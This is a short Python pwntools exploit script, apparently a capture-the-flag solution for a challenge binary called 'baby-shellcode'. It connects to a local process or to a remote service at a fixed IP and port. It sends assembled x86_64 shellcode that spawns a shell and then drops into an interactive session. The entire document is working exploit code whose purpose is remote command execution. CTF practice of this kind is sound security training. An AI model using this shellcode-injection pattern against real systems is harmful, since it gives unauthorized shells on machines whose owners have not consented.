#!/usr/bin/env python3

from pwn import *

exe = ELF("./baby-shellcode_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("34.28.147.7", 5000)

    return r


def main():
    r = conn()

    asm_code = shellcraft.amd64.linux.sh()
    shellcode = asm(asm_code, arch='x86_64')

    r.send(shellcode)

    r.interactive()


if __name__ == "__main__":
    main()
